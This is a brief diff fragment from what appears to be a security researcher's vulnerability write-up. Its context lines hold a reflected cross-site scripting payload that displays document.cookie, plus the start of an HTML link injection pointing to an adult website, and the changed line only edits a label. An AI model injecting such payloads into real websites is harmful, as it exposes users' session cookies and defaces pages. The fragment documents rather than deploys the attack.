@@ -76,7 +76,7 @@ nu11secur1ty<script>alert(document.cookie)</script>
 ```
 
 - 0.5.4 - Stupid Reflected blow 0ut
-- - AN
+- - @n@1
 
 ```
 <a href="https://www.pornhub.com" target="_blank">
